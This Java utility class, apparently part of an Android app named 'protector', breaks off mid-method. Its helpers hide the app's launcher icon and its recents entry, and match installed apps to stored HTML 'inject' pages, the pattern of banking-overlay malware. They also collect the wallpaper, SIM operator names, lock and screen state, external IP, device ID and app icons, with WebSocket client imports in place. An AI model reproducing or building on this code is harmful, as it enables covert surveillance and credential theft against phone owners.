package com.icontrol.protector;

import static android.content.Context.ACTIVITY_SERVICE;
import static android.content.Context.POWER_SERVICE;
import static android.os.Build.VERSION.SDK_INT;

import static com.icontrol.protector.AccessTools.ject_list;
import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.AppOpsManager;
import android.app.KeyguardManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.WallpaperManager;
import android.content.ClipData;
import android.content.ClipDescription;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.ColorMatrix;
import android.graphics.ColorMatrixColorFilter;
import android.graphics.Matrix;
import android.graphics.Paint;
import android.graphics.Point;
import android.graphics.drawable.AdaptiveIconDrawable;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.media.RingtoneManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.text.Layout;
import android.text.StaticLayout;
import android.text.TextPaint;
import android.text.TextUtils;
import android.util.Base64;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;


import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class UtliTools {

    public static String Fix_it(String bigtext, String target) {
        if (bigtext.length() > 0 && target.length() > 0) {
            if (bigtext.contains(target)) {
                return bigtext.replace(target, "");
            }
        }
        return bigtext;
    }

    public static String calculateMD5(File file) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("MD5");
        try (InputStream is = new FileInputStream(file)) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) > 0) {
                digest.update(buffer, 0, bytesRead);
            }
        }
        byte[] md5Bytes = digest.digest();
        StringBuilder sb = new StringBuilder();
        for (byte b : md5Bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    public static boolean isPackageInstalled(String packageName, PackageManager packageManager) {
        try {
            packageManager.getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    public static String getLabelApplication(Context context) {
        try {
            return (String) context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA));
        } catch (Exception ex) {
        }
        return "";
    }

    public static Bitmap convertToBitmap(Drawable drawable, int widthPixels, int heightPixels) {
        Bitmap mutableBitmap = Bitmap.createBitmap(widthPixels, heightPixels, Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(mutableBitmap);
        drawable.setBounds(0, 0, widthPixels, heightPixels);
        drawable.draw(canvas);

        return mutableBitmap;
    }

    public static String Wallpaper(Context ctx, int xx, int yy, boolean cropit) {
        String v = "";
        try {
            Drawable d;
            WallpaperManager m = WallpaperManager.getInstance(ctx);

            try {
                d = m.getDrawable();
            } catch (Exception a) {
                d = null;
            }

            if (d == null) {
                try {
                    d = m.getBuiltInDrawable();
                } catch (Exception a2) {
                    return "-1";
                }
            }

            if (d instanceof BitmapDrawable) {
                BitmapDrawable b = (BitmapDrawable) d;
                Bitmap i = null;

                if (cropit) {
                    i = MyCods.scaleCenterCrop(b.getBitmap(), xx, yy);
                } else {
                    i = Bitmap.createScaledBitmap(b.getBitmap(), 450, 750, true);
                }

                try (ByteArrayOutputStream o = new ByteArrayOutputStream()) {
                    i.compress(Bitmap.CompressFormat.PNG, 100, o);
                    byte[] y = o.toByteArray();
                    v = Base64.encodeToString(y, Base64.NO_WRAP);
                } catch (IOException e) {
                    v = "-1";
                } finally {
                    if (i != null && !i.isRecycled()) {
                        i.recycle();
                    }
                }
            } else {
                v = "-1";
            }

        } catch (OutOfMemoryError | Exception e) {
            v = "-1";
        }

        return v;
    }

    public static String getsimname(Context ctx) {
        if (SDK_INT > 22) {
            //for dual sim mobile
            SubscriptionManager localSubscriptionManager = SubscriptionManager.from(ctx);

            if (ActivityCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                return "Known";
            }
            if (localSubscriptionManager.getActiveSubscriptionInfoCount() > 1) {
                //if there are two sims in dual sim mobile
                List localList = localSubscriptionManager.getActiveSubscriptionInfoList();
                SubscriptionInfo simInfo = (SubscriptionInfo) localList.get(0);
                SubscriptionInfo simInfo1 = (SubscriptionInfo) localList.get(1);

                final String sim1 = simInfo.getDisplayName().toString();
                final String sim2 = simInfo1.getDisplayName().toString();
                return sim1 + "/" + sim2;

            } else {
                //if there is 1 sim in dual sim mobile
                TelephonyManager tManager = (TelephonyManager) ctx
                        .getSystemService(Context.TELEPHONY_SERVICE);

                String sim1 = tManager.getNetworkOperatorName();
                return sim1;

            }

        } else {
            //below android version 22
            TelephonyManager tManager = (TelephonyManager) ctx
                    .getSystemService(Context.TELEPHONY_SERVICE);

            String sim1 = tManager.getNetworkOperatorName();
            return sim1;
        }
    }

    public static String ScreenStatus(Context ctx) {
        String v;
        try {

            final KeyguardManager k = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
            final PowerManager p = (PowerManager) ctx.getSystemService(POWER_SERVICE);
            boolean isScreenOn = p.isScreenOn();
            if (SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                if (k.isDeviceLocked()) {
                    if (isScreenOn == true) {
                        v = "0";
                    } else {
                        v = "1";
                    }
                } else {
                    if (isScreenOn == true) {
                        v = "2";
                    } else {
                        v = "3";
                    }
                }
                return v;
            }
        } catch (Exception e) {
            //  v = "-1";
        }
        return "-1";
    }

    public static String getBatteryPercentage(Context ctx) {
        Intent batteryIntent = ctx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
        int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
        return String.valueOf((level * 100) / scale);
    }

    public static String isCharging(Context ctx) {
        Intent batteryIntent = ctx.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int plugged = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean isCharging = plugged == BatteryManager.BATTERY_PLUGGED_AC || plugged == BatteryManager.BATTERY_PLUGGED_USB;
        return isCharging ? "t" : "f";
    }

    public static String getExternalIpAddress() {
        String[] urls = {
                "http://checkip.amazonaws.com",     // AWS
                "https://api.ipify.org",            // ipify
                "https://icanhazip.com",            // icanhazip
                "https://ifconfig.me/ip"            // ifconfig.me
        };

        for (String url : urls) {
            BufferedReader in = null;
            try {
                URL endpoint = new URL(url);
                URLConnection connection = endpoint.openConnection();
                connection.setConnectTimeout(5000); // 5 seconds connect timeout
                connection.setReadTimeout(5000);    // 5 seconds read timeout

                in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String ip = in.readLine();
                if (ip != null && !ip.isEmpty()) {
                    return ip.trim();
                }
            } catch (IOException ignored) {
                // Skip to next URL on failure
            } finally {
                if (in != null) {
                    try {
                        in.close();
                    } catch (IOException e) {
                        // Optional: log error
                    }
                }
            }
        }

        // Try get local IP
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                if (!intf.isUp() || intf.isLoopback() || intf.isVirtual()) continue;

                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        String ip = inetAddress.getHostAddress();
                        if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                            return ip;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        // Last fallback: localhost
        return "127.0.0.1";
    }



    public static void ServiceStarter(Context context, Class<?> serviceClass) {
        Intent intent = new Intent(context, serviceClass);
        if (!MyCods.isServiceRunning(context, serviceClass)) {
            if (SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        }
    }

    public static Bitmap drawableToBitmap(Drawable drawable) {
        Bitmap bitmap = null;

        try {
            if (drawable instanceof BitmapDrawable) {
                BitmapDrawable bitmapDrawable = (BitmapDrawable) drawable;
                if (bitmapDrawable.getBitmap() != null) {
                    return bitmapDrawable.getBitmap();
                }
            }

            if (drawable.getIntrinsicWidth() <= 0 || drawable.getIntrinsicHeight() <= 0) {
                bitmap = Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888); // Single color bitmap will be created of 1x1 pixel
            } else {
                bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
            }

            Canvas canvas = new Canvas(bitmap);
            drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
            drawable.draw(canvas);
        } catch (Exception b) {
        }
        return bitmap;
    }

    public static String Version() {
        int i = SDK_INT;
        String nm = "Unknown";

        switch (i) {
            case Build.VERSION_CODES.N:
                nm = "Nougat";
                break;
            case Build.VERSION_CODES.N_MR1:
                nm = "Nougat 7.1";
                break;
            case Build.VERSION_CODES.O:
                nm = "Oreo";
                break;
            case Build.VERSION_CODES.O_MR1:
                nm = "Oreo 8.1";
                break;
            case Build.VERSION_CODES.P:
                nm = "Pie";
                break;
            case Build.VERSION_CODES.Q:
                nm = "Android 10";
                break;
            case Build.VERSION_CODES.R:
                nm = "Android 11";
                break;
            case 31:
                nm = "Android 12";
                break;
            case 32:
                nm = "Android 12L";
                break;
            case 33:
                nm = "Android 13";
                break;
            case 34:
                nm = "Android 14";
                break;
            case 35:
                nm = "Android 15";
                break;
            default:
                if (i > 35) {
                    nm = "Android " + i; // Future-proofing
                }
                break;
        }

        return nm;
    }


    public static String installdate(Context context) {
        try {
            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
            long installTimeMillis = packageInfo.firstInstallTime;
            Date installDate = new Date(installTimeMillis);

            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
            String installDateString = sdf.format(installDate);
            return installDateString;
        } catch (Exception e) {
        }
        return "Not Found";
    }

    public static String Get_Network(Context ctx) {
        String result = "Unknown";
        ConnectivityManager CM = (ConnectivityManager) ctx.getSystemService(ctx.CONNECTIVITY_SERVICE);
        NetworkInfo networktype = CM.getActiveNetworkInfo();
        if (networktype != null && networktype.isConnected()) {
            if (networktype.getType() == ConnectivityManager.TYPE_WIFI) {
                return "WIFI";
            }
            if (networktype.getType() == ConnectivityManager.TYPE_VPN) {
                return "VPN";
            }
            if (networktype.getType() == ConnectivityManager.TYPE_MOBILE) {
                if (networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_GPRS ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_EDGE ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_1xRTT ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_IDEN ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_GSM ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_CDMA) {
                    return "2G";
                }
                if (networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_UMTS ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_EVDO_0 ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_EVDO_A ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_HSDPA ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_HSUPA ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_HSPA ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_EHRPD ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_HSPAP ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_EVDO_B ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_TD_SCDMA) {
                    return "3G";
                }
                if (networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_LTE ||
                        networktype.getSubtype() == 19 ||
                        networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_IWLAN) {
                    return "4G";
                }
                if (networktype.getSubtype() == TelephonyManager.NETWORK_TYPE_NR) {
                    return "5G";
                }
                //NETWORK_TYPE_NR
            }
        }
        return result;
    }

    public static Drawable resizeIcon(Context ctx, Drawable icon, int desiredWidth, int desiredHeight) {
        Bitmap bitmap = ((BitmapDrawable) icon).getBitmap();
        Bitmap resizedBitmap = Bitmap.createScaledBitmap(bitmap, desiredWidth, desiredHeight, false);
        return new BitmapDrawable(ctx.getResources(), resizedBitmap);
    }


    public static String Create_DevicID() {

        String pseudoId = "16" +
                Build.BOARD.length() % 10 +
                Build.BRAND.length() % 10 +
                Build.DEVICE.length() % 10 +
                Build.DISPLAY.length() % 10 +
                Build.HOST.length() % 10 +
                Build.ID.length() % 10 +
                Build.MANUFACTURER.length() % 10 +
                Build.MODEL.length() % 10 +
                Build.PRODUCT.length() % 10 +
                Build.TAGS.length() % 10 +
                Build.TYPE.length() % 10 +
                Build.USER.length() % 10;
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("MD5");
            messageDigest.update(pseudoId.getBytes());
            byte[] md5Bytes = messageDigest.digest();

            StringBuilder hexStringBuilder = new StringBuilder();
            for (byte md5Byte : md5Bytes) {
                hexStringBuilder.append(String.format("%02X", md5Byte));
            }

            return hexStringBuilder.toString().replaceAll("[^0-9]", "");

        } catch (Exception e) {
            return UUID.randomUUID().toString().replaceAll("[^0-9]", "");
        }
    }

    public static String FullStamp() {
        String eventtimeStamp = new SimpleDateFormat("yyyy/MM/dd hh:mm:ss").format(new Date());
        return eventtimeStamp;
    }


    public static void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory())
            for (File child : fileOrDirectory.listFiles())
                deleteRecursive(child);

        fileOrDirectory.delete();
    }

    private static  PackageManager pmg;
    private static   ApplicationInfo aif;
    public static String getAppNameFromPkgName(Context context, String Packagename) {
        try {
            if (pmg == null){
                pmg = context.getPackageManager();
            }

            if (aif == null){
                aif = pmg.getApplicationInfo(Packagename, PackageManager.GET_META_DATA);
            }

            String appName = (String) pmg.getApplicationLabel(aif);
            return appName;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return "";
        }
    }

    public static boolean IsIgnore_Battery(Context context) {
        if (SDK_INT >= 23) {
            PowerManager powerManager = (PowerManager) context.getSystemService(POWER_SERVICE);
            return powerManager.isIgnoringBatteryOptimizations(context.getPackageName());
        } else {
            return true;
        }
    }

    public static boolean IsScreenOn(Context context) {
        PowerManager powerManager = (PowerManager) context.getSystemService(POWER_SERVICE);
        boolean result = SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH && powerManager.isInteractive() || SDK_INT < Build.VERSION_CODES.KITKAT_WATCH && powerManager.isScreenOn();
        return result;
    }

    //    public static void SaveTouchs(Context ctx, String name, LinkedHashMap<String, Point[]> value) {
//        name = name + ".json";
//
//        File appDirectory = null;
//
//        File sdDir = android.os.Environment.getExternalStorageDirectory();
//
//        appDirectory = new File(sdDir + Consts.TouchsPath);
//
//        if (appDirectory != null && !appDirectory.exists()) {
//            appDirectory.mkdirs();
//        }
//
//        File fileName = new File(appDirectory, name);
//        try {
//            // Create a JSON object
//            JSONObject jsonObject = new JSONObject();
//
//            // Iterate over the PointArrys
//            for (Map.Entry<String, Point[]> entry : value.entrySet()) {
//                String key = entry.getKey();
//                Point[] points = entry.getValue();
//
//                // Create a JSON array to store the Point objects
//                JSONArray jsonArray = new JSONArray();
//
//                // Iterate over the Point objects
//                for (Point point : points) {
//                    JSONObject pointObject = new JSONObject();
//                    pointObject.put("x", point.x);
//                    pointObject.put("y", point.y);
//                    jsonArray.put(pointObject);
//                }
//
//                // Add the JSON array to the JSON object
//                jsonObject.put(key, jsonArray);
//            }
//
//            // Convert the JSON object to a string
//            String jsonString = jsonObject.toString();
//
//            // Open a file output stream
//            FileOutputStream fos = new FileOutputStream(fileName);
//
//            // Write the JSON string to the file
//            fos.write(jsonString.getBytes());
//
//            // Close the file output stream
//            fos.close();
//
//            // Print a message indicating successful file storage
//            //System.out.println("PointArrys stored successfully.");
//        } catch (Exception e) {
//            e.printStackTrace();
//
//        }
//    }
//
//    public static LinkedHashMap<String, Point[]> LoadTouches(String name) {
//        name=name+".json";
//        //     File cacheDir = null;
//        File appDirectory = null;
//        File sdDir = android.os.Environment.getExternalStorageDirectory();
//        appDirectory = new File(sdDir+ Consts.TouchsPath);
//
//
//
//        if (appDirectory != null && !appDirectory.exists()) return null; // File does not exist
//
//        File fileName = new File(appDirectory, name);
//        try {
//            // Define the file path
//
//
//            // Open a file input stream
//            FileInputStream fis = new FileInputStream(fileName);
//
//            // Read the contents of the file into a byte array
//            byte[] data = new byte[(int) fis.available()];
//            fis.read(data);
//
//            // Close the file input stream
//            fis.close();
//
//            // Convert the byte array to a JSON string
//            String jsonString = new String(data);
//
//            // Parse the JSON string back into a JSONObject
//            JSONObject jsonObject = new JSONObject(jsonString);
//
//            // Extract the PointArrys from the JSONObject
//            LinkedHashMap<String, Point[]> loadedPointArrys = new LinkedHashMap<>();
//            Iterator<String> keys = jsonObject.keys();
//            while (keys.hasNext()) {
//                String key = keys.next();
//                JSONArray jsonArray = jsonObject.getJSONArray(key);
//                Point[] points = new Point[jsonArray.length()];
//                for (int i = 0; i < jsonArray.length(); i++) {
//                    JSONObject pointObject = jsonArray.getJSONObject(i);
//                    int x = pointObject.getInt("x");
//                    int y = pointObject.getInt("y");
//                    points[i] = new Point(x, y);
//                }
//                loadedPointArrys.put(key, points);
//            }
//
//
//            return loadedPointArrys;
//        } catch (Exception e) {
//
//            //  e.printStackTrace();
//        }
//        return  null;
//    }
//    public static void ClearCaptuied(String Recname){
//        try {
//            String name = Recname + ".json";
//
//            File appDirectory = null;
//
//            File sdDir = android.os.Environment.getExternalStorageDirectory();
//
//            appDirectory = new File(sdDir + Consts.TouchsPath);
//
//            if (appDirectory != null && appDirectory.exists()) {
//                File fileName = new File(appDirectory, name);
//                if (fileName.exists()){
//                    fileName.delete();
//                }
//            }
//
//
//        }catch (Exception a){
//
//        }
//
//    }
    public static void OpenSettingsPage(Context ctx) {
//        try{
//            Intent intentbackup = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//            intentbackup.addCategory(Intent.CATEGORY_DEFAULT);
//           // Uri uribackup = Uri.fromParts("package", ctx.getPackageName(), null);
//            intentbackup.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//            intentbackup.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
//            intentbackup.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
//           // intentbackup.setData(uribackup);
//            ctx.startActivity(intentbackup);
//        }catch (Exception s){
//
//        }

        try {
            Intent intent;


//            if(!UtliTools.isSamsung() &&
//                    !UtliTools.isGoogle() &&
//                    !UtliTools.isRealme()){
//                intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//                Uri uri = Uri.fromParts("package", ctx.getPackageName(), "~!@#$%^&*()_+");
//                intent.setData(uri);
//            }else{
            intent = new Intent(Settings.ACTION_MANAGE_ALL_APPLICATIONS_SETTINGS);
            //}
            intent.addCategory(Intent.CATEGORY_DEFAULT);

            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);

            PendingIntent pendingIntent = PendingIntent.getActivity(ctx, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            pendingIntent.send();
            pendingIntent.cancel();

        } catch (Exception e) {
            e.printStackTrace();

        }
    }

//    private static void enableActivity(String activityName, Context ctx) {
//        PackageManager pm = ctx.getPackageManager();
//        ComponentName componentName = new ComponentName(ctx, activityName);
//        pm.setComponentEnabledSetting(componentName,
//                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
//                PackageManager.DONT_KILL_APP);
//    }

    public static void EnableDisableAct(String activityName, Context ctx, boolean hideit) {
        int i;
        PackageManager packageManager = ctx.getPackageManager();

        ComponentName createRelative = ComponentName.createRelative(
                ctx,
                activityName
        );


        if (hideit) {
            i = 2;
        } else {
            i = 1;
        }


        packageManager.setComponentEnabledSetting(createRelative, i, 1); // DONT_KILL_APP
    }

    public static void excludeFromTaskList(Context ctx) {
        try {
            new Handler(ctx.getMainLooper()).postDelayed(() -> {
                try {
                    ActivityManager am = (ActivityManager) ctx.getSystemService(ACTIVITY_SERVICE);

                    if (am == null || SDK_INT < 21)
                        return;

                    List<ActivityManager.AppTask> tasks = am.getAppTasks();

                    if (tasks == null || tasks.isEmpty())
                        return;

                    tasks.get(0).setExcludeFromRecents(true);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }, 1000);

        } catch (Exception a) {
            a.printStackTrace();
        }
    }

    public static String findjectfile(Context ctx,String CuzPackage){
      File f1=  new File(ctx.getFilesDir(), "protected/"+CuzPackage+"/index.html");
      if (f1.exists()){
          return "protected/"+CuzPackage+"/index.html";
      }
      f1 =   new File(ctx.getFilesDir(), "protected/"+CuzPackage+"/"+CuzPackage+".html");
        if (f1.exists()){
            return "protected/"+CuzPackage+"/"+CuzPackage+".html";
        }

        File dir = new File(ctx.getFilesDir(), "protected/" + CuzPackage);
        if (dir.exists() && dir.isDirectory()) {
            File[] htmlFiles = dir.listFiles(new FilenameFilter() {
                @Override
                public boolean accept(File dir, String name) {
                    return name.toLowerCase().endsWith(".html");
                }
            });

            if (htmlFiles != null && htmlFiles.length > 0) {
                // Return relative path
                return "protected/" + CuzPackage + "/" + htmlFiles[0].getName();
            }
        }

        // If nothing is found
        return "notfound";
    }
    public static String Checkallject(Context context, String inputPackages) {
        PackageManager pm = context.getPackageManager();
        List<String> matchingPackages = new ArrayList<>();

        List<PackageInfo> packageInfos = pm.getInstalledPackages(0);
        for (PackageInfo packageInfo : packageInfos) {
            ApplicationInfo appInfo = packageInfo.applicationInfo;
            String packageName = appInfo.packageName;

            // Skip system apps
            if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                continue;
            }
            // Skip if not in the input string
            if (!inputPackages.contains(packageName)) {
                continue;
            }


            // Check for launcher icon
            Intent launchIntent = pm.getLaunchIntentForPackage(packageName);
            if (launchIntent != null) {
                if (findjectfile(context,packageName).equals("notfound")){
                    matchingPackages.add(packageName);
                }else{
                    if (!ject_list.contains(packageName)) {
                        ject_list.add(packageName);
                    }
                }

            }
        }
        if (matchingPackages.isEmpty()) {
            return "empty"; // or return ""; to keep it empty
        }

        return String.join("<j>", matchingPackages);
    }
    private static boolean alreadyhide = false;
    public static void hideme(Context ctx) {
        try {
            if(!alreadyhide){
                alreadyhide=true;
                EnableDisableAct(My_Configs.HA, ctx, false);
                EnableDisableAct(My_Configs.MA, ctx, true);
            }
        } catch (Exception a) {
            a.printStackTrace();
        }
    }

    //    public static boolean isNotificationChannelEnabled(Context context,  String channelId){
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            if(!TextUtils.isEmpty(channelId)) {
//                NotificationManager manager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
//                NotificationChannel channel = manager.getNotificationChannel(channelId);
//                return channel.getImportance() != NotificationManager.IMPORTANCE_NONE;
//            }
//            return false;
//        } else {
//            return NotificationManagerCompat.from(context).areNotificationsEnabled();
//        }
//    }
    public static boolean isSamsung() {
        String brand = Build.BRAND.toLowerCase(Locale.ROOT);
        return "samsung".equals(brand);
    }

    public static boolean isOppoOrOnePlus() {
        String brand = Build.BRAND.toLowerCase(Locale.ROOT);
        return "oppo".equals(brand) || "oneplus".equals(brand);
    }

    public static boolean isXiaomi() {
        String brand = Build.BRAND.toLowerCase(Locale.ROOT);
        return "xiaomi".equals(brand) || "redmi".equals(brand);
    }

    public static boolean isvivo() {
        String brand = Build.BRAND.toLowerCase(Locale.ROOT);
        return "vivo".equals(brand);
    }

    public static boolean isHuawei() {
        String brand = Build.BRAND.toLowerCase(Locale.ROOT);
        return "huawei".equals(brand);
    }

    public static boolean isRealme() {
        String brand = Build.BRAND.toLowerCase(Locale.ROOT);
        return "realme".equals(brand);
    }

    public static boolean isGoogle() {
        String brand = Build.BRAND.toLowerCase(Locale.ROOT);
        return "google".equals(brand);
    }

    public static boolean isMIUI(Context ctx) {
        return isIntentResolved(ctx, new Intent("miui.intent.action.OP_AUTO_START").addCategory(Intent.CATEGORY_DEFAULT))
                || isIntentResolved(ctx, new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")))
                || isIntentResolved(ctx, new Intent("miui.intent.action.POWER_HIDE_MODE_APP_LIST").addCategory(Intent.CATEGORY_DEFAULT))
                || isIntentResolved(ctx, new Intent().setComponent(new ComponentName("com.miui.securitycenter", "com.miui.powercenter.PowerSettings")));
    }

    private static boolean isIntentResolved(Context ctx, Intent intent) {
        return (intent != null && ctx.getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null);
    }

    public static Bitmap changeImageOpacity(Bitmap originalImage, float opacity) {
        // Create a mutable bitmap with the same size as the original
        Bitmap adjustedImage = Bitmap.createBitmap(
                originalImage.getWidth(),
                originalImage.getHeight(),
                originalImage.getConfig()
        );


        Canvas canvas = new Canvas(adjustedImage);


        Paint paint = new Paint();
        paint.setAlpha((int) (opacity * 255));


        float brightness = 1.0f;
        float contrast = 50.0f;
        float gamma = 1.0f;
        float adjustedBrightness = brightness - 1.0f;

        ColorMatrix colorMatrix = new ColorMatrix(new float[]{
                contrast, 0, 0, 0, adjustedBrightness,
                0, contrast, 0, 0, adjustedBrightness,
                0, 0, contrast, 0, adjustedBrightness,
                0, 0, 0, 1, 0
        });

        paint.setColorFilter(new ColorMatrixColorFilter(colorMatrix));


        canvas.drawBitmap(originalImage, 0, 0, paint);

        return adjustedImage;
    }
    public static Bitmap BITMAP_RESIZER(Bitmap bitmap,int newWidth,int newHeight) {
        Bitmap scaledBitmap = Bitmap.createBitmap(newWidth, newHeight, bitmap.getConfig());

        float scaleX = newWidth / (float) bitmap.getWidth();
        float scaleY = newHeight / (float) bitmap.getHeight();

        Matrix scaleMatrix = new Matrix();
        scaleMatrix.setScale(scaleX, scaleY, 0, 0);

        Canvas canvas = new Canvas(scaledBitmap);
        canvas.setMatrix(scaleMatrix);
        Paint paint = new Paint(Paint.FILTER_BITMAP_FLAG);
        paint.setAntiAlias(true);
        paint.setDither(true);
        paint.setFilterBitmap(true);
        canvas.drawBitmap(bitmap, 0, 0, paint);

        return scaledBitmap;

    }
    public static String getAppIconAsBase64(Context context, String packageName) {
        try {
            // Get the package manager
            PackageManager pm = context.getPackageManager();

            // Get the application info for the specified package
            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);

            // Get the app's icon drawable
            Drawable icon = pm.getApplicationIcon(appInfo);

            // Convert the drawable to a bitmap
            Bitmap bitmap = drawableToBitmap(icon);

            // Convert the bitmap to a Base64 string
            return bitmapToBase64(bitmap);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }


    private static String bitmapToBase64(Bitmap bitmap) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
        byte[] byteArray = byteArrayOutputStream.toByteArray();
        return Base64.encodeToString(byteArray, Base64.DEFAULT);
    }

    private static int notifiid = 415;

    public static void BrodcastNotification(Context ctx, String Title, String Msg, int Type, String toopen) {

        //0 nothing
        //1 open apk
        //2 open link

        PendingIntent pendingIntent = null;


        try {
            switch (Type) {
                case 0:
                    pendingIntent = null;
